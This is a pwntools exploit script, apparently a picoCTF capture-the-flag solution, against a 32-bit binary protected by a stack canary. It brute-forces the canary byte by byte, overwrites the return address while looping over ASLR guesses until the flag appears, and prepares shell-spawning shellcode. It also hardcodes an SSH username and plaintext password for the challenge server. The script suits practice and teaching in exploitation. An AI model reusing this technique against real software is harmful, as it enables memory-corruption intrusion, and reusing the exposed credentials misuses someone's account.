#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
import sys
import os
import string

# Set up pwntools for the correct architecture
context.update(arch='i386')
context.terminal = ['tmux', 'splitw', '-h'] #GDB splits
#context.log_level = 'DEBUG'
exe = './vuln.6'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
if args.REMOTE:
    s = ssh(host='2019shell1.picoctf.com', user='numin0us',
    password='BYG6zuxUHj1597Sf')


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return s.process('vuln',
                         cwd='/problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0')
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
set stop-on-solib-events 1
#set breakpoint pending en
break *vuln
break *vuln+189
break *vuln+272
break *display_flag
break *main
continue
continue
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

KEY_LEN = 4
BUF_SIZE = 32 

def brute_force_canary():
    canary = ""
    for i in range(KEY_LEN):
        for c in string.ascii_letters + string.digits:
            with context.local(log_level='ERROR'):
                try:
                    io = start()
                    io.sendlineafter("Please enter the length of the entry:\n> ", str(BUF_SIZE + len(canary) + 1))
                    io.sendlineafter("Input> ", fit({BUF_SIZE: canary + c}))
                    response = io.recvline()
                    if b"Stack Smashing Detected" in response:
                        continue
                    canary += c
                    print(canary)
                    break
                finally:
                    io.close()
        else:
            raise Exception("Can't find canary")
    return canary


elf = ELF(exe)
ret = 0x565a57ed

shellcode = asm(shellcraft.sh())
#payload = cyclic(200)

#canary = brute_force_canary()
canary = b'33xO'
print(canary)


#Bruteforce aslr
while True:
    io = start()
    io.recv()
    io.sendline('200')
    io.recv()
    payload = fit({32: canary, 52: ret}, length=200)
    io.sendline(payload)
    response = io.recvall()

    if b'pico' not in response:
        continue
    else:
        print(response)
        sys.exit()

#io.recv()
#io.sendline(payload)


# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

